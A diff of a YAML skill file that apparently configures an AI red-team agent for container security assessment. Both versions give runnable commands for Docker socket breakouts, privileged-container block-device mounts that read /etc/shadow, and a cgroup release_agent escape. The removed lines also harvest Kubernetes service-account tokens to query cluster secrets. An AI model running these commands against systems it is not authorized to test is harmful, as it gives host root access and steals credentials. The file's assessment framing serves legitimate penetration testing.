@@ -1,65 +1,72 @@
 schema_version: 1
 version: 3.0.0
 name: container-security
-description: Senior container and Kubernetes security assessment — Docker socket breakouts, privileged container escapes, Kubernetes RBAC auditing, and pod service account abuse.
+description: >
+  Container runtime security assessment and host breakouts — Docker socket mounting (/var/run/docker.sock),
+  privileged container capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE), cgroups v1 release_agent escape,
+  and host filesystem volume mounts.
 triggers:
   - container
   - docker
   - docker escape
-  - kubernetes
-  - k8s
-  - serviceaccount
-  - kubelet
-  - rbac
+  - docker socket
   - cgroup
+  - privileged container
+  - container breakout
+  - containerd
 tools:
   - curl
   - find
 knowledge: |
-  Assess container runtimes, Kubernetes clusters, and virtualization isolation layers with senior red-team precision.
+  Assess container runtime configurations and isolation boundaries for host breakout opportunities
+  with senior red-team precision.
 
-  1. CONTAINER RUNTIME DETECTION & POSTURE:
-     - Confirm container execution environment:
-       `test -f /.dockerenv || grep -qE 'docker|kubepods|containerd' /proc/1/cgroup`
-     - Check container hostname and assigned IP (frequently 172.17.x.x for Docker bridge or 10.244.x.x for Kubernetes CNI).
+  1. CONTAINER RUNTIME DETECTION & ENUMERATION:
+     - Verify container execution environment:
+       test -f /.dockerenv || grep -qE 'docker|containerd' /proc/1/cgroup
+     - Enumerate process capabilities:
+       grep CapEff /proc/self/status (decode using capsh --decode=<hex>)
+     - Identify mounted filesystems and volumes:
+       df -h; mount | grep -E "(/dev/sd|/dev/vd|/dev/nvme|docker)"
 
-  2. DOCKER DAEMON SOCKET EXPOSURE (/var/run/docker.sock):
-     Mounting the host Docker socket inside a container provides instantaneous root escalation on the host machine:
-     - Test socket access:
-       `ls -la /var/run/docker.sock`
-       `curl -s --unix-socket /var/run/docker.sock http://localhost/version`
-     - Host Breakout Execution:
-       `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host`
-       or manually create a container via raw Docker REST API.
+  2. DOCKER DAEMON SOCKET EXPLOITATION (/var/run/docker.sock):
+     Mounting the host Docker socket inside a container yields immediate root on the underlying host:
+     - Verify socket accessibility:
+       curl -s --unix-socket /var/run/docker.sock http://localhost/version
+     - List host containers and images:
+       curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
+     - Breakout via privileged container creation:
+       curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
+         -d '{"Image":"alpine","Cmd":["chroot","/host","id"],"Binds":["/:/host"]}' \
+         http://localhost/containers/create
 
-  3. PRIVILEGED CONTAINER & LINUX CAPABILITY BREAKOUTS:
-     - Inspect container capabilities:
-       `capsh --print`
-     - The `CAP_SYS_ADMIN` Breakout:
-       If running under `--privileged` or possessing `CAP_SYS_ADMIN`, raw block devices are accessible:
-       • Identify host disks: `fdisk -l` or `ls -la /dev/sd* /dev/nvme* /dev/vd*`
-       • Mount host storage directly into container filesystem:
-         `mkdir -p /mnt/host && mount /dev/sda1 /mnt/host`
-         `cat /mnt/host/etc/shadow`
+  3. PRIVILEGED CONTAINER BREAKOUT (CAP_SYS_ADMIN):
+     If the container runs with `--privileged` or `CAP_SYS_ADMIN`:
+     a. Direct Block Device Mount:
+        List host storage partitions: `fdisk -l` or `ls -la /dev/sd* /dev/vd* /dev/nvme*`
+        Mount host root partition to local directory:
+          mkdir /tmp/host_root && mount /dev/sda1 /tmp/host_root
+        Access host filesystem directly at `/tmp/host_root`.
+     b. Cgroup v1 release_agent Escape:
+        If using cgroups v1 with notify_on_release:
+          mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
+          echo 1 > /tmp/cgrp/notify_on_release
+          echo "/bin/sh -c 'echo ESCAPED > /tmp/host_marker'" > /tmp/cmd
+          chmod +x /tmp/cmd
+          echo "/tmp/cmd" > /tmp/cgrp/release_agent
 
-  4. KUBERNETES SERVICE ACCOUNT TOKEN HARVESTING & RBAC:
-     Every Kubernetes pod typically mounts a service account token:
-     - Token Assets:
-       • Token: `/var/run/secrets/kubernetes.io/serviceaccount/token`
-       • Namespace: `/var/run/secrets/kubernetes.io/serviceaccount/namespace`
-       • Cluster CA: `/var/run/secrets/kubernetes.io/serviceaccount/ca.crt`
-     - Interrogate Kubernetes Cluster API:
-       Query cluster endpoints using the mounted service account file:
-       `curl -s -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/secrets`
-       `curl -s -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/pods`
-     - Test permissions: probe if the service account has `create pods`, `get secrets`, or `exec` rights.
+  4. SENSITIVE HOST FILESYSTEM MOUNTS:
+     Search for host directories mounted into container:
+       grep -E "(/etc|/var|/home|/root|/proc)" /proc/mounts | grep -v "/proc/sys"
+     - Exposed `/etc`: inspect `/etc/shadow` or cron jobs on host.
+     - Exposed host `/proc`: access host processes, environment variables, and `/proc/sysrq-trigger`.
 
-  5. KUBELET DIRECT API PROBING:
-     Inspect node kubelet ports if reachable across the network:
-     • Port 10255 (Read-Only): `http://<node_ip>:10255/pods` (discloses running pods, containers, and environment variables).
-     • Port 10250 (Authenticated): probe `/pods` with captured cluster tokens.
+  5. EVIDENCE & CLEANUP:
+     - Demonstrate host-level access non-destructively: read `/etc/hostname` of host vs container hostname.
+     - Unmount any temporarily mounted block devices immediately after verification.
 references:
-  - persona:container-security-v3
+  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
+  - https://attack.mitre.org/techniques/T1611/
 provenance:
   origin: builtin
   source: persona/v0.1/skills/container-security.yaml
